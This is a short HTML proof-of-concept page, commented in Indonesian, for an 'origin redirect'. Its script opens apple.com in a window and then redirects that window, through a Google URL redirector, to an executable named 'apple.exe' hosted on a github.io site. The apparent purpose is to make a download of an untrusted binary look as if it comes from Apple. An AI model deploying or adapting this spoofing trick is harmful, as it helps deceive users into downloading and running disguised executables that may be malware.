<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Non-setTimeout Origin Redirect PoC</title>
</head>
<body>

<script>
function a() {
    // Step 1: buka trusted domain
    let win = window.open("https://apple.com", "x");

    // Step 2: redirect saat page load (event-based, bukan timing)
    win.onload = function () {
        win.location.href =
            "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe";
    };
}
</script>

<center>
    <input type="button" value="DOWNLOAD" onclick="a()">
</center>

</body>
</html>
